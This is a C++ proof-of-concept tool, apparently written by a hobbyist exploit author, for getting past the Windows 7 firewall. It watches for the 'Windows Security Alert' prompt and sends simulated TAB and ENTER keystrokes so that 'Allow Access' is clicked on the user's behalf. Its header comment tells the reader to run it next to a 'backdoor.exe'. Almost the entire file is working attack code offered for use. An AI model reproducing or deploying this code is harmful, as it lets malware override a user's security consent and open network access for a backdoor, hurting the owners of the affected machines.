/*
A Proof of Concept how bypass windows firewall
Tested at windows 7

Author: Antonio Costa aka Cooler_,  CoolerVoid
coolerlair@gmail.com

Greetz: M0nad, I4K, Slyfunky, Sigsegv, RaphaelSC, MMxM, F-117, Clandestine, LoganBr, Welias, Luanzeiro, Alan JUmpi...

This bypass the windows firewall, Search firewall GUI if found uses winapi to simulate keystroke tab, enter to allow access of firewall

Example:

g++ bypass_firewall.cpp -o bypass

Click in open at bypass.exe, leave program running

run backdoor.exe, wait the alert of firewall window appear,  look the programm bypass.exe make the bypass at window!

*/
#define WINVER 0x0500
#include <string>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

using namespace std;
using std::string;

string GetActiveWindowTitle()
{
  char wnd_title[256];
  
  HWND hwnd=GetForegroundWindow(); 
  GetWindowText(hwnd,wnd_title,sizeof(wnd_title));
  
  return wnd_title;
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
  char buffer[128];  
      int written = GetWindowTextA(hwnd, buffer, 128);

      if (written && strstr(buffer,"Windows Security Alert") != NULL) // name of firewall GUI title
  {
          *(HWND*)lParam = hwnd;
          return FALSE;
      }

    return TRUE;
}

HWND GetFirewall()
{
    HWND hWnd = NULL;
    EnumWindows(EnumWindowsProc, (LPARAM)&hWnd);
    return hWnd;
}

int main()
{
  short first=0;
PULLBACK:
      
      HWND alertwindow = GetFirewall();
    
    
// detect firewall alert window...
      if(BringWindowToTop(alertwindow))
      {
        INPUT ip;
        
        DWORD dwCurrentThread = GetCurrentThreadId();
        DWORD dwFGThread      = GetWindowThreadProcessId(GetForegroundWindow(), NULL);
        AttachThreadInput(dwCurrentThread, dwFGThread, TRUE);
        SetForegroundWindow(alertwindow);
        AttachThreadInput(dwCurrentThread, dwFGThread, FALSE);
        SetForegroundWindow(alertwindow);
        
        puts("\nBINGOOO\n");
        Sleep(100); // you can change the wait time
        
        SetForegroundWindow(alertwindow);  
        short x=6;
        
// press TAB six times to leave to Allow Acess button
        while(x && first!=0)
        {
          ip.type = INPUT_KEYBOARD;
          ip.ki.wScan = 0; 
          ip.ki.time = 0;
          ip.ki.dwExtraInfo = 0;
          ip.ki.wVk = 0x09; // virtual-key code of TAB
          ip.ki.dwFlags = 0; 
          SendInput(1, &ip, sizeof(INPUT));
          ip.ki.dwFlags = KEYEVENTF_KEYUP; 
          SendInput(1, &ip, sizeof(INPUT));
          Sleep(100);
          x--;
        }
        
        if(!x && first!=0)
        {
// press ENTER at Allow Acess button
          ip.type = INPUT_KEYBOARD;
          ip.ki.wScan = 0; 
          ip.ki.time = 0;
          ip.ki.dwExtraInfo = 0;
 
          ip.ki.wVk = 0x0D; // virtual-key code of ENTER
          ip.ki.dwFlags = 0; 
          SendInput(1, &ip, sizeof(INPUT));
          ip.ki.dwFlags = KEYEVENTF_KEYUP; 
          SendInput(1, &ip, sizeof(INPUT));
        }
        first=1;  
        Sleep(150); // wait time

      }
    
      Sleep(200);  

  goto PULLBACK;
  
}
